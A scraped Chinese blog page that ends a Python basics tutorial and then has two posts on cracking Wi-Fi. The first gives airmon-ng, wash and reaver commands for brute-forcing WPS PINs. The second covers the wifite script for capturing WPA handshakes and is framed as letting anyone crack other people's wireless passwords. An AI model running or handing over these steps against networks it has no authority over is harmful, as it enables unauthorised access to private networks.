<p>in 及 not in 操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if &apos;klion&apos; in list_info:</span><br><span class="line">	print(&apos;yeah is inter! &apos;)</span><br><span class="line">else:</span><br><span class="line">	print(&apos;Oh No!&apos;)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if &apos;xlion&apos; not in list_info:</span><br><span class="line">	print(&apos;yeah is outer! &apos;)</span><br><span class="line">else:</span><br><span class="line">	print(&apos;Oh No!&apos;)</span><br><span class="line">`</span><br></pre></td></tr></table></figure>
<p>4] 元祖类型,关键字,tuple,用’()’表示,内部一级元素是不可修改的,也就是说对一级元素项不可以增删改查,俗称,’只读列表’,但对于元素项中的子列表是可以修改的,习惯性的在元祖最后多加个逗号,元祖也是有序的</p>
<p>同上,通过索引,切片取值,多层嵌套取值,常用方法,如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">count(指定要统计次数的元素) 统计某个</span><br><span class="line">index(指定要获取索引的元素) 获取某个元素的索引位置</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tuple_res = (&apos;ok&apos;,&apos;connect&apos;,110,&apos;status&apos;,&apos;login&apos;,110,&apos;succeed&apos;,[1,2,3,(&apos;yeah&apos;,&apos;here&apos;,&apos;linux&apos;,[23,5,354,23],),5],)</span><br><span class="line">print(tuple_res)</span><br><span class="line">print(tuple_res[0])</span><br><span class="line">print(tuple_res[3:6])</span><br><span class="line">print(tuple_res[2:5])</span><br><span class="line">print(tuple_res.count(110))</span><br><span class="line">print(tuple_res.index(&apos;connect&apos;))</span><br><span class="line">print(tuple_res[7][3][3][2])</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for iterm in range(len(tuple_res)):</span><br><span class="line">	print(iterm,&apos;=&gt;&apos;,tuple_res[iterm])</span><br></pre></td></tr></table></figure>
<p>5] 列表和元祖的一点区别:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">元祖和列表本质几乎是一模一样的,但元祖中的一级元素是不允许修改的而列表中的元素都是可以被随意修改的</span><br></pre></td></tr></table></figure></p>
<p>6] 字典类型,关键字 dict,用’{key-&gt;value}’表示,里面的value可以是任意类型的数据,key可以是数字,字符串,元祖,但它只有索引,不能切片,字典是无序的,默认for循环只有key,另外,元祖,列表,字典可以相互嵌套,类似php中的’数组’<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">dict_info = &#123;</span><br><span class="line">	&apos;name&apos;:&apos;klion&apos;,</span><br><span class="line">	&apos;age&apos; :&apos;26&apos;,</span><br><span class="line">	&apos;email&apos;:&apos;sec@sec.org&apos;,</span><br><span class="line">	&apos;phone&apos;:&apos;12334213&apos;,</span><br><span class="line">	&apos;list_info&apos; : &#123;</span><br><span class="line">		&apos;a&apos;:12,</span><br><span class="line">		&apos;b&apos;:13,</span><br><span class="line">		&apos;c&apos;:14</span><br><span class="line">	&#125;,</span><br><span class="line">	&apos;city&apos;:[&apos;bj&apos;,&apos;ne&apos;,&apos;ko&apos;,&apos;to&apos;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>字典是根据键取值的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(dict_info[&apos;email&apos;])</span><br><span class="line">print(dict_info)</span><br></pre></td></tr></table></figure></p>
<p>字典常用的一些内置方法:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">get(指定目标字典的key) 取出字典中的某个key对应的值,如果key不存在返回None</span><br><span class="line">gets = dict_info.get(&apos;age&apos;)</span><br><span class="line">print(gets)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pop() 删除字典中指定的值</span><br><span class="line">dels = dict_info.pop(&apos;phone&apos;)</span><br><span class="line">print(dels)</span><br><span class="line">print(dict_info)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">keys() 把目标字典中的所有键取出来放到一个新的字典中</span><br><span class="line">keys = dict_info.keys()</span><br><span class="line">print(keys)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">values()把目标字典中的所有值取出来放到一个新的字典中</span><br><span class="line">values = dict_info.values()</span><br><span class="line">print(values)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">items()把目标字典中的所有键值取出来放到一个新的字典中</span><br><span class="line">items = dict_info.items()</span><br><span class="line">print(items)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">clear()清空目标字典,单单只是清空并不是删除</span><br><span class="line">nulls = dict_info.clear()</span><br><span class="line">print(nulls)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">update()更新某个键的值</span><br><span class="line">new_age = dict_info.update(&#123;&apos;name&apos;:&apos;sec&apos;,&apos;age&apos;:&apos;45&apos;&#125;)</span><br><span class="line">print(new_age)</span><br><span class="line">print(dict_info)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fromkeys()  根据指定的key生成一个统一值的字典</span><br><span class="line">allkey = dict_info.fromkeys([&apos;name&apos;,&apos;linces&apos;,&apos;tmp_num&apos;],18)</span><br><span class="line">print(allkey)</span><br></pre></td></tr></table></figure>
<p>7] 集合类型,关键字 set,由不同元素组成,且必须为不可变类型,即字符,数字,元祖,默认是无序的,另外,内部会自动去重</p>
<p>定义一个集合<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s = &#123;1,2,3,4,5,&apos;klion&apos;,&apos;sec@sec.org&apos;,&apos;sec&apos;,&apos;klion&apos;,&apos;kali&apos;,4,&apos;wow&apos;&#125;</span><br><span class="line">p = &#123;3,5,&apos;sec&apos;,&apos;nuddle&apos;,&apos;backbox&apos;,&apos;fedora&apos;&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add() 向集合中添加元素</span><br><span class="line">s.add(&apos;linux&apos;)</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy()  将集合复制一份</span><br><span class="line">new_set = s.copy()</span><br><span class="line">print(new_set)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop()  随机删除集合中的一个元素</span><br><span class="line">s.pop()</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">clear() 清空集合中所有的元素,并非删除集合本身</span><br><span class="line">s.clear()</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">remove() 删除集合中指定的某个元素,如果没有该元素,会报错</span><br><span class="line">s.remove(&apos;klion&apos;)</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">discard() 删除集合中指定的元素,如果没有该元素,不会报错,常用</span><br><span class="line">s.discard(&apos;xlion&apos;)</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure>
<p>集合中常用的一些内置方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s_n = set(s)</span><br><span class="line">p_n = set(p)</span><br><span class="line">print(s_n)</span><br><span class="line">print(p_n)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">交集 intersection() 或者 &amp;  取出两个集合中的共同部分</span><br><span class="line">print(&apos;交集&apos;,s_n&amp;p_n)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">并集 union() 或者 |把两个集合中的所有元素去重合并</span><br><span class="line">print(&apos;并集&apos;,s_n|p_n)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">差集 difference() 或者 -  取出s_n中p_n没有的元素</span><br><span class="line">print(&apos;差集&apos;,s_n-p_n)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">补集 symmetric_difference() 或者 ^ 把两个集合合并然后抠除共有元素,留下剩余部分</span><br><span class="line">print(&apos;补集&apos;,s_n^p_n)</span><br></pre></td></tr></table></figure>
<p>0x13 python 基本数据类型小结:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">对于字符串而言,执行一个功能,都会产生一个新的字符串</span><br><span class="line">对于list,tuple,dic,执行一个方法,大多都是直接更新自身</span><br></pre></td></tr></table></figure></p>
<p>0x14 python 常用的一些运算符:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">算数运算符[ 乘除取余优先级高于加减 ]</span><br><span class="line">+(加) -(减) *(乘以) /(除) //(直接取整,并非四舍五入) %(取余) **(x**y 表示x的y次方)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">注意:</span><br><span class="line">如果想在2.7中如果想让9/2输出结果为4.5就必须先引入下面的模块</span><br><span class="line">from __future__ import division   </span><br><span class="line"></span><br><span class="line">python 2.7 </span><br><span class="line">9/2 = 4</span><br><span class="line"></span><br><span class="line">python 3.x</span><br><span class="line">9/2 = 4.5</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">赋值运算符</span><br><span class="line">= += -= *= /= %= **= //=</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">比较运算符(只返回真假)</span><br><span class="line">==(等于) !=(不等于) &lt;&gt;(不等于,相当于!=) &gt;(大于) &lt;(小于) &gt;=(大于或者等于) &lt;=(小于或等于)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">逻辑运算符 [ not的优先级最高,平时自己写代码时,最好把逻辑运算都加上括号 ]</span><br><span class="line">and(且) or(或) not(非)</span><br><span class="line"></span><br><span class="line">如果有连续多逻辑运算操作且没加括号,则严格按照从左到右一个个计算,总结规律如下 </span><br><span class="line">真 遇到 or 最终结果肯定为真</span><br><span class="line">假 遇到 and 最终结果肯定为假</span><br><span class="line"></span><br><span class="line">短路原则</span><br><span class="line">and 前面一个条件为假,后面就不再计算了</span><br><span class="line">or 前面条件如果为假,后面继续计算</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">成员运算符(专门用来寻找一个字符串是否在另一个字符串里面),返回布尔值</span><br><span class="line">in </span><br><span class="line">not in</span><br><span class="line">字符 in 字符串  	判断某个字符或字符序列是否在某个字符串中</span><br><span class="line">字符 not in 字符串  判断某个字符或字符序列是否不在某个字符串中</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">三元运算符</span><br><span class="line">值1[成立] if 条件 else 值2[不成立]</span><br><span class="line">True if id &gt; 1 else False</span><br></pre></td></tr></table></figure>
<p>0x15 python中常用的一些辅助方法:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">type() 	查看某个变量的数据类型</span><br><span class="line">id() 	查看变量在内存中的地址</span><br><span class="line">help(type(变量))</span><br><span class="line">dir(变量)</span><br><span class="line">input() 凡是从input中输入的内容默认都是字符串类型的,如果输入的是字符串数字则需要自己手工用int强制转换下</span><br></pre></td></tr></table></figure></p>
<p>0x16 python 流程控制格式:</p>
<p>条件判断:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">单分之判断:</span><br><span class="line">if 条件:</span><br><span class="line">	条件成立,执行此语句</span><br><span class="line">	条件成立,执行此语句 [ 注意缩进必须一一对应 ]</span><br><span class="line">else:</span><br><span class="line">	条件不成立,执行此语句</span><br></pre></td></tr></table></figure></p>
<p>多分之:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if 条件一:</span><br><span class="line">	条件成立,执行此语句</span><br><span class="line">elif 条件二:</span><br><span class="line">	条件成立,执行此语句</span><br><span class="line">elif 条件三:</span><br><span class="line">	条件成立,执行此语句</span><br><span class="line">else:</span><br><span class="line">	条件不成立,执行此语句[ pass表示什么都不做 ]</span><br></pre></td></tr></table></figure></p>
<p>循环控制:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">while 条件[每执行完一次回来看下条件是否还满足,如果满足就继续循环,知道不满足退出循环,务必谨记在最后给退出条件]:</span><br><span class="line">	要循环的语句</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while 条件: </span><br><span class="line">	....</span><br><span class="line">else: 当上面的条件都不成立时则执行此代码块中语句,只会执行一次</span><br><span class="line">	....</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">break 跳出当前整个循环,且后面的代码不再执行</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">continue 只跳出当前这一次的循环,继续下一次循环</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for 变量 in 条件:</span><br><span class="line">	要循环的语句</span><br><span class="line">else:</span><br><span class="line">	上面的循环被正常执行完,也就是中间没有任何break或者continue,才会执行else里面的东西</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">range(起始值,总数,每次迭代的步长)</span><br><span class="line">可专门用来获取指定范围内的数,默认是0开始的</span><br><span class="line">for iterm in range(0,10,2):</span><br><span class="line">	print(iterm)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">enumrate(可迭代的对象,起始位置[默认从0开始]) 会把这个可迭代对象的索引及索引对应的值一一遍历出来,如下,前面是索引,后面是索引对应的值</span><br><span class="line">li = [&apos;redhat&apos;,&apos;debian&apos;,&apos;feodra&apos;,&apos;parrot&apos;,&apos;backbox&apos;,&apos;kali&apos;,&apos;alex&apos;,&apos;sec&apos;]</span><br><span class="line">for iterm,fix in enumerate(li):</span><br><span class="line">	print(iterm,fix)</span><br></pre></td></tr></table></figure>
<p>0x17 在python钟对字符串进行格式化输出:</p>
<p>第一种[百分号]:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%s 代表字符串,但它基本所有类型都能接收,用的最多,一般都用这个</span><br><span class="line">%d 代表数字,也就是说它只能接受整形</span><br><span class="line">%f 只能接收小数,浮点数,默认加6位的精度</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">common_out = &apos;Work hard to move yourself %s, work hard to do nothing, you will succeed %d&apos; % (&apos;klion&apos;,100)</span><br><span class="line">common_out = &apos;Work hard to move yourself %(name)s, work hard to do nothing, you will succeed %(num)d&apos; % &#123;&apos;name&apos;:&apos;sec&apos;,&apos;num&apos;:33&#125;</span><br><span class="line">common_out = &apos;Work hard to move yourself %s, work hard to do nothing, you will succeed %.3f&apos; % (&apos;klion&apos;,1234.23123123)</span><br><span class="line">common_out = &apos;Work hard to move yourself %s, work hard to do nothing, you will succeed %d%%&apos; % (&apos;klion&apos;,100)</span><br><span class="line">print(common_out)</span><br></pre></td></tr></table></figure>
<p>第二种[format方式]:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">:d 整数</span><br><span class="line">:s 字符串</span><br><span class="line">:f 浮点型</span><br><span class="line">:b 二进制输出</span><br><span class="line">*  代表直接传列表</span><br><span class="line">** 代表直接传字典</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">format_out = &apos;Work hard to move yourself &#123;name&#125;, work hard to do nothing, you will succeed &#123;num&#125;&apos;.format(name=&apos;sec&apos;,num=123)</span><br><span class="line">format_out = &apos;Work hard to move yourself &#123;name&#125;, work hard to do nothing &#123;mail&#125;, you will succeed &#123;num&#125;&apos;.format(**&#123;&apos;name&apos;:&apos;security&apos;,&apos;num&apos;:123,&apos;mail&apos;:&apos;sec@sec.org&apos;&#125;)</span><br><span class="line">print(format_out)</span><br></pre></td></tr></table></figure>
<p>后话:<br>&nbsp;&nbsp;&nbsp;&nbsp;当你真正熟练掌握了一门脚本语言之后,再去学另一门脚本语言,其实上手用起来是很快的,这些基础语法正常情况下半天就应该搞定了</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2015/04/17/reaver-crack-pin-code/">
                利用reaver破解目标pin码
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2015-04-17</span>
            
            
            
                <span class="category">
                    <a href="/categories/wpa-wpa2-crack/">wpa/wpa2 crack</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br><br>1,说到pin码就不得不提wps,它是一种特殊的无线认证协议,当路由器开启wps功能后,会随机生成一个8位的pin码,通过暴力枚举这个pin码(共11000中可能),就可以达到破解目标wifi的目的,很不错的现象是,现在很多路由器默认就开启了wps功能<br><br><br>关于pin码爆破的具体原理简要分析,如下:<br>&nbsp;&nbsp;前4位为第一部分,第5-7位为第二部分,最后1位为第三部分<br>&nbsp;&nbsp;第一部分的验证跟第二部分没关联,最后1位的结果是根据第二部分计算得出的校验码<br>&nbsp;&nbsp;破解一开始是会先单独对第一部分进行pin码匹配,<br>&nbsp;&nbsp;也就是说先破解前4位pin码,而前4位也就是0000-9999共有10000个组合<br>&nbsp;&nbsp;当前4位pin码确定后再对第二部分进行pin码匹配,<br>&nbsp;&nbsp;再对5-7位进行破解,而5-7位是000-999,共有1000个组合<br>&nbsp;&nbsp;当前7位都确定后,最后1位也会自动得出,即破解完成<br>&nbsp;&nbsp;根据pin码破解的原理,可以看到只需要枚举11000种情况就会必然破解出pin码,<br>&nbsp;&nbsp;从而通过pin得到wifi密码,这么点儿组合对计算机来讲,破解出来是迟早的,不过实际很大程度上还要依赖于目标路由的网络状况和信号强弱<br>&nbsp;&nbsp;<img src="/img/pin.jpg" alt="pin码格式"><br></p>
<p>2,具体的pin码破解流程如下,首先,依然是先开启网卡的监听模式:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># airmon-ng start wlan0</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/airmon.png" alt="开启网卡监听模式"><br></p>
<p>3,而后,开始扫描附近所有开启了wps的无线设备,locked状态为’No’的,都可以作为下手的目标<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># wash -i wlan0mon --ignore-fcs  这里有时会报fcs错误,加上该选项即可</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/sec.png" alt="扫描附近开了wps的无线设备"><br></p>
<p>4,使用reaver工具爆破pin码,关于reaver 一些选项作用如下:<br>&nbsp;&nbsp;-i     监听后的网卡接口名称<br>&nbsp;&nbsp;-b  指定目标无线ap的mac地址<br>&nbsp;&nbsp;-a  自动检测目标AP最佳配置<br>&nbsp;&nbsp;-S  使用最小的DH key(提高破解速度)<br>&nbsp;&nbsp;-vv 显示详细的破解过程<br>&nbsp;&nbsp;-d  即delay每穷举一次的闲置时间预设为1秒<br>&nbsp;&nbsp;-t  即timeout每次穷举等待反馈的最长时间,即破解超时时长<br>&nbsp;&nbsp;-c  指定频道可以方便找到无线信号,如-c 1 指定1频道</p>
<p>根据无线信号强弱针对性的调整下命令:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># reaver -i wlan0mon -b MAC -a -S -vv -d0 -c 1  		信号非常好</span></span><br><span class="line"><span class="comment"># reaver -i wlan0mon -b MAC -a -S -vv -d2 -t 5 -c 1		信号普通</span></span><br><span class="line"><span class="comment"># reaver -i wlan0mon -b MAC -a -S -vv -d5 -c 1			信号一般</span></span><br><span class="line"><span class="comment"># reaver -i wlan0mon -b MAC -S -N -vv -c 4</span></span><br><span class="line"><span class="comment"># reaver -i wlan0mon -b DC:EE:06:96:B7:B8 -S -N -vv -c 6</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/reaver_finsal.png" alt="开始爆破pin码"><br></p>
<p>最后,当reaver pin完之后会显示出目标的WPS PIN(正确的pin码)码和WPA PSK密码(正确的wifi密码)<br><br><br>5,假如目标的wpa psk密码被修改了,但wps功能却没有关,pin码也没有改,你还是可以直接用reaver再次获取目标wifi密码,如下:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># reaver -i mon0 -b mac -p pin码</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h5 id="一点小结"><a href="#一点小结" class="headerlink" title="一点小结:"></a>一点小结:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;其实,搞清楚具体的破解原理之后,你会发现其实也并没什么实际性的技术含量,只需要写程序组包跑就是了,可能就是验证的过程有点儿复杂需要多花些时间,但工具(reaver)现在别人都已经为我们写好了,我们所能做的,会用即可,仅此而已,另外,个人并也极不建议一开始破解无线的时候就用这个方法,因为它的速度,大家也可以看到了,影响的因素太多,导致了它非常的慢,尤其是对实地渗透来讲,我们可能根本没有那么长的时间等,所以,能用aircrack搞定的就直接用aircrack来搞定,实在搞不定,再考虑这个也不迟,仅仅是个人建议而已……!</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2015/04/16/auto-crack-wifi/">
                利用wifite脚本全自动获取握手包
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2015-04-16</span>
            
            
            
                <span class="category">
                    <a href="/categories/wpa-wpa2-crack/">wpa/wpa2 crack</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p>0x01 wifite 脚本仓库地址 [ Kali NetHunter 中可能用的居多 ]:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/derv82/wifite</span><br></pre></td></tr></table></figure></p>
<p>0x02 关于使用wifite脚本的好处<br>&nbsp;&nbsp;&nbsp;&nbsp;你可以不用再像aircrack那样繁琐的手工输入各种命令,而是把一切都交给代码变成一种完全傻瓜式的交互操作,其实,本质上还是在调用的各种外部工具[aircrack]来帮其实现,脚本基于py,关于更多更详细运作细节,请自行看代码,今天的目的主要是教大家怎么快速把它用起来,非常简单,简单到你基本不用懂任何技术就可以随意破解别人的无线密码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># wifite -h    查看wifite的所有帮助选项</span><br></pre></td></tr></table></figure></p>
<p>下面是破解<code>wpa/wpa2</code>相关的一些选项<br><img src="/img/wpa2.png" alt="破解wpa/wpa2的相关帮助"><br>破解古老的<code>wep(基本已淘汰,反正我是没见过)</code>相关选项<br><img src="/img/wep.png" alt="破解wep的相关帮助"><br>关于<code>wps(一种新的认证协议,并非直接使用密码验证而是用pin码,更多内容,请自行谷歌)</code>的一些相关破解选项<br><img src="/img/pin.png" alt="破解wps的相关帮助"><br><br></p>
<p>0x03 关于wifite脚本的具体使用过程,如下,插入事先准备好的无线网卡[同样,务必是aircrack所支持的无线网卡芯片才可以],执行下面的命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># wifite --wpa --mac --wpadt 20 -aircrack  这里暂以破解wpa2为例,关于wep和wps的破解请自行尝试</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/wifite.png" alt="运行wifite脚本"></p>
<p><code>ctrl+c</code> 即可停止扫描,选择你要破解的无线,几个栏目的意思分别是<br><code>无线编号,无线工作信道,加密类型,信号强弱(值越高信号越强),目标是否启用wps,有无客户端在线(s表示同时有多个客户端在线)</code><br><img src="/img/wfcrack.png" alt="选择要攻击的无线热点"></p>
